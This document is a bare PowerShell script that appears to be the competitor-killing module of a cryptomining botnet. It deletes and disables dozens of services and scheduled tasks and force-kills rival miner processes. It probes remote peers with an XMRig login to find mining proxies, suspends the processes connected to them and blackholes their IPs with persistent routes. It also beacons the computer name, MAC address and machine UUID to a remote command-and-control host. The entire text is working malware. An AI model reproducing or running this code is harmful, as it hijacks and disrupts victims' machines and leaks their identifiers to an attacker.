if(!$down_url){

    $down_url = 'http://d.u78wjdu.com'

}

try{$version=$ifmd5[0..5]-join""}catch{}

function isPubIP {

	Param(

    [parameter(Mandatory=$true)][String]$ip

	)

	$resIps = @(

		@(4026531840L, 3758096384L),

		@(4026531840L, 4026531840L),

		@(4278190080L, 0L),

		@(4278190080L, 167772160L),

		@(4278190080L, 2130706432L),

		@(4290772992L, 1681915904L),

		@(4293918720L, 2886729728L),

		@(4294836224L, 3323068416L),

		@(4294901760L, 2851995648L),

		@(4294901760L, 3232235520L),

		@(4294967040L, 3221225472L),

		@(4294967040L, 3221225984L),

		@(4294967040L, 3227017984L),

		@(4294967040L, 3325256704L),

		@(4294967040L, 3405803776L),

		@(4294967295L, 4294967295L)

	)

	$iparr = $ip.split(".")

	$iplong = 0

	for($i=3;$i -ge 0; $i--){

		$iplong = $iplong -bor [int]$iparr[3-$i] * [math]::pow(2,8*$i)

	}

	for($j=0;$j -lt $resIps.count;$j++){

		if(($iplong -band $resIps[$j][0]) -eq $resIps[$j][1]){

			return $false

		}

	}

	return $true

}


function ssl_connect($ip,$port,$send_str){

    $ret = ""

    try{

        $socket = New-Object Net.Sockets.TcpClient($ip, $port)

        $sslStream = New-Object System.Net.Security.SslStream($socket.GetStream(),$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))

        $sslStream.ReadTimeout = 5000

        $sslStream.AuthenticateAsClient('')

        $writer = new-object System.IO.StreamWriter($sslStream)

        $reader = new-object System.IO.StreamReader($sslStream)

        $writer.WriteLine($send_str)

        $writer.flush()

        $ret = $reader.ReadLine()

        $socket.close()

    }catch{}

    return $ret  

}

function raw_connect($ip,$port,$send_str){

    try{ 

        $client = NEW-objEcT Net.Sockets.TcpClient($ip,$port)

        $sock = $client.Client

        $bytes = [Text.Encoding]::ASCII.GetBytes($send_str)

        $sock.send(($bytes)) | out-null

        $sock.ReceiveTimeout = 5000

        $res = [Array]::CreateInstance(('byte'), 10000)

        $recv = $sock.Receive($res)

        $res = $res[0..($recv-1)]

        $str = [Text.Encoding]::ASCII.getstring($res)

        return $str

    }catch{}

    return ""

}

function ishttp($ip,$port){

    $data="GET / HTTP/1.1nn"

    $ret = raw_connect $ip $port $data

    if($ret.indexOf("HTTP/1") -ne -1){

        return $true

    }

    return $false

}

function ishttps($ip,$port){

    $data = "GET / HTTP/1.1nn"

    $ret = ssl_connect $ip $port $data

    if($ret.indexOf("HTTP/1") -ne -1){

        return $true

    }

    return $false

}

function isminerproxy($ip,$port){

    $data ='{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"x","pass":null,"agent":"XMRig/5.13.1","algo":["cn/1","cn/2","cn/r","cn/fast","cn/half","cn/xao","cn/rto","cn/rwz","cn/zls","cn/double","rx/0","rx/wow","rx/loki","rx/arq","rx/sfx","rx/keva"]}}' + "n"

    $ret = raw_connect $ip $port $data

    if($ret.indexOf("jsonrpc") -ne -1){

        write-host "miner proxy!!"

        return $true

    }

    return $false

}

function isminerproxys($ip,$port){

    $data = '{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"x","pass":null,"agent":"XMRig/5.13.1","algo":["cn/1","cn/2","cn/r","cn/fast","cn/half","cn/xao","cn/rto","cn/rwz","cn/zls","cn/double","rx/0","rx/wow","rx/loki","rx/arq","rx/sfx","rx/keva"]}}'

    $ret = ssl_connect $ip $port $data

    if($ret.indexOf("jsonrpc") -ne -1){

        write-host "miner proxys!!"

        return $true

    }

    return $false

}

Add-Type -TypeDefinition 'using System;using System.Diagnostics;using System.Security.Principal;using System.Runtime.InteropServices;public static class Kernel32{[DllImport("kernel32.dll")] public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess,out bool pbDebuggerPresent);[DllImport("kernel32.dll")] public static extern int DebugActiveProcess(int PID);[DllImport("kernel32.dll")] public static extern int DebugActiveProcessStop(int PID);}'

function ProcessSuspend($id){

    $procName = (Get-Process -id $id -ErrorAction SilentlyContinue).name

    if($procName -eq $null){

        Write-Host "ERROR: There is no process with an ID of $id"

        return

    }

    Write-host "Attempting to suspend $procName (PID: $id)..."

    if ($id -le 0) {

        write-host "You didn't input a positive integer"

        return

    }       

    $debug = whoami /priv | Where-Object{$_ -like "*SeDebugPrivilege*"}     

    if($debug -ne $null){                

        $DebugPresent = [IntPtr]::Zero

        $out = [Kernel32]::CheckRemoteDebuggerPresent(((Get-Process -Id $id).Handle),[ref]$debugPresent)

        if ($debugPresent){

            write-host "There is already a debugger attached to this process"

            return

        }

        $suspend = [Kernel32]::DebugActiveProcess($id)

        if ($suspend -eq $false){

            write-host "ERROR: Unable to suspend $procName (PID: $id)"

        } 

        else{

            write-host "The $procName process (PID: $id) was successfully suspended!"

        }

    }

    else{

        write-host "ERROR: You do not have debugging privileges to pause any process"

        return

    }   

}

function gmd5($d){

	[Security.Cryptography.MD5]::Create().ComputeHash($d)|foreach{$l+=$_.ToString('x2')}

	return $l

}

function getprotected(){

    function getrname(){

        function gmd5($d){

            [Security.Cryptography.MD5]::Create().ComputeHash($d)|foreach{$l+=$_.ToString('x2')}

            return $l

        }

        $rpath="C:\Windows\System32\Windowspowershell\V1.0"

        $enames = gci "$rpath\*" -Include *.exe -Exclude powershell.exe|foreach{$_.name}

        $tmd5 = gmd5 ([IO.File]::ReadAllBytes("$rpath\powershell.exe"))

        foreach($ename in $enames){

            $md5_=gmd5 ([IO.File]::ReadAllBytes("$rpath\$ename"))

            if($tmd5 -eq $md5_){

                return $ename

            }

        }

        return "NULLNULL"

    }

    $comp_name = $env:COMPUTERNAME

    $guid = (get-wmiobject Win32_ComputerSystemProduct).UUID

    $mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where {$_.ipenabled -EQ $true}).Macaddress | select-object -first 1

    $m6exe=(gmd5 ([system.Text.Encoding]::UTF8.GetBytes($comp_name+$guid+$mac))).substring(0,6)

    $pids=@()

    $pids+=Get-WmiObject -Class Win32_Process|Where-Object{$_.path -like '*m6g.bin.exe*' -or $_.path -like '*m6.bin.exe*' -or $_.path -like "*$m6exe*" -or $_.name -eq (getrname)}|foreach{$_.processid} 

    return $pids

}

function sendmsg($ip,$ismproxy,$mpid){

    try{

        $mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where {$_.ipenabled -EQ $true}).Macaddress | select-object -first 1

        $guid = (get-wmiobject Win32_ComputerSystemProduct).UUID

        $comp_name = $env:COMPUTERNAME

        if($ip -eq ''){

            $url = "$down_url/kl_repo.json?$version&$global:retry&$comp_name&$mac&$guid"

        } else {

            $pname = Get-Process -id $mpid | Select-Object -ExpandProperty Name

            $url = "$down_url/rellik.json?$version&$global:retry&$comp_name&$mac&$guid&$ip&$ismproxy&$mpid&$pname"

        }

        (New-Object Net.WebClient).DownloadString($url)

    }catch{}

}

function banIp($ip){

    route add $ip 0.0.0.0 IF 1 -p

}

function unbanIp($ip){

    route delete $ip 0.0.0.0

}

Function Killer {

	$SrvName = "xWinWpdSrv", "SVSHost", "Microsoft Telemetry", "lsass", "Microsoft", "system", "Oracleupdate", "CLR", "sysmgt", "\gm", "WmdnPnSN", "Sougoudl","National", "Nationaaal", "Natimmonal", "Nationaloll", "Nationalmll","Nationalaie","Nationalwpi","WinHelp32","WinHelp64", "Samserver", "RpcEptManger", "NetMsmqActiv Media NVIDIA", "Sncryption Media Playeq","SxS","WinSvc","mssecsvc2.1","mssecsvc2.0","Windows_Update","Windows Managers","SvcNlauser","WinVaultSvc","Xtfy","Xtfya","Xtfyxxx","360rTys","IPSECS","MpeSvc","SRDSL","WifiService","ALGM","wmiApSrvs","wmiApServs","taskmgr1","WebServers","ExpressVNService","WWW.DDOS.CN.COM","WinHelpSvcs","aspnet_staters","clr_optimization","AxInstSV","Zational","DNS Server","Serhiez","SuperProServer",".Net CLR","WissssssnHelp32","WinHasdadelp32","WinHasdelp32","ClipBooks"

	write-host "kill services..."

    foreach($Srv in $SrvName) {

		$Null = SC.exe Config $Srv Start= Disabled

		$Null = SC.exe Stop $Srv

		$Null = SC.exe Delete $Srv

	}


	$TaskName = "my1","Mysa", "Mysa1", "Mysa2", "Mysa3", "ok", "Oracle Java", "Oracle Java Update", "Microsoft Telemetry", "Spooler SubSystem Service","Oracle Products Reporter", "Update service for  products", "gm", "ngm","Sorry","Windows_Update","Update_windows","WindowsUpdate1","WindowsUpdate2","WindowsUpdate3","AdobeFlashPlayer","FlashPlayer1","FlashPlayer2","FlashPlayer3","IIS","WindowsLogTasks","System Log Security Check","Update","Update1","Update2","Update3","Update4","DNS","SYSTEM","DNS2","SYSTEMa","skycmd","Miscfost","Netframework","Flash","RavTask","GooglePingConfigs","HomeGroupProvider","MiscfostNsi","WwANsvc","Bluetooths","Ddrivers","DnsScan","WebServers","Credentials","TablteInputout","werclpsyport","HispDemorn","LimeRAT-Admin","DnsCore","Update service for Windows Service","DnsCore","ECDnsCore"

    write-host "kill tasks..."

	foreach ($Task in $TaskName) {

		SchTasks.exe /Delete /TN $Task /F 2> $Null

	}


	$Miner = "SC","WerMgr","WerFault","DW20","msinfo", "XMR*","xmrig*", "minerd", "MinerGate", "Carbon", "yamm1", "upgeade", "auto-upgeade", "svshost",

	"SystemIIS", "SystemIISSec", 'WindowsUpdater*', "WindowsDefender*", "update", 

	"carss", "service", "csrsc", "cara", "javaupd", "gxdrv", "lsmosee", "secuams", "SQLEXPRESS_X64_86", "Calligrap", "Sqlceqp", "Setting", "Uninsta", "conhoste","Setring","Galligrp","Imaging","taskegr","Terms.EXE","360","8866","9966","9696","9797","svchosti","SearchIndex","Avira","cohernece","win","SQLforwin","xig*","taskmgr1","Workstation","ress","explores"

	write-host "kill processes..."

	foreach ($m in $Miner) {

		Get-Process -Name $m -ErrorAction SilentlyContinue | Stop-Process -Force

	}

	$tm = Get-Process -Name TaskMgr -ErrorAction SilentlyContinue


	if($tm -eq $null){

		Start-Process -WindowStyle hidden -FilePath Taskmgr.exe

	}

    $tcpconn = NetStat -anop TCP

    $ipcache=@('170.187.149.77:80','138.68.186.90:80','176.58.99.231:80','138.68.251.24:80','165.227.62.120:443','202.182.120.192:443','178.62.2.194:443','138.68.4.19:443','176.58.99.231:443','138.68.251.24:443','85.117.234.189:443','159.203.122.42')

    foreach($tempip in $ipcache){

        unbanIp $tempip

    }

    $ppids = getprotected

    write-host "kill connections..."

    foreach ($t in $tcpconn) {

        $line = $t.split(' ')| ? {$_}

        if ($line -eq $null) { continue }

        if ($t.contains("LISTENING") -and ($line[1].contains("43669") -or $line[1].contains("43668"))) {

            $ppids += $line[-1]

            continue

        }

        if($t.contains("ESTABLISHED") -and ($line[2].gettype() -eq "".gettype()) -and ($line[2].indexOf(":") -ne -1)){

            $ip,$port = $line[2].split(':')

            $currpid = $line[-1]

            if(($ipcache -contains $line[2]) -or ($ppids -contains $currpid) -or ($ip.length -lt 4) -or -not(isPubIP $ip) -or ($port -le 0)){

                continue

            }

            if($global:ipdealcache -contains $line[2]){

                ProcessSuspend $currpid

                banIp $ip

                continue

            }

            write-host "try $ip $port..."

            if(((ishttp $ip $port) -eq $false) -and ((ishttps $ip $port) -eq $false)){

                write-host "end http test..."

                $ismproxy = 0

                if((isminerproxy $ip $port) -eq $true){

                    $ismproxy = 1

                } else{

                    if((isminerproxys $ip $port) -eq $true){

                        $ismproxy = 2

                    }

                }

                if($ismproxy -ne 0){

                    ProcessSuspend $currpid

                    banIp $ip

                    $global:ipdealcache += $line[2]

                    sendmsg $line[2] $ismproxy $currpid

                }

            }

            if($ipcache -notcontains $line[2]){$ipcache += $line[2]}

        }

    }

    $global:retry++

}

$start_time=Get-Date -UFormat "%s"

$global:ipdealcache=@()

$global:retry=0

$ser=[System.Net.Sockets.TcpListener]65529

$ser.start()

while($true){

    if(((Get-Date -UFormat "%s")-$start_time) -gt 60000) {break}

    "try to kill..."

	Killer

    "kill done..."

	Start-Sleep -Seconds 600

}


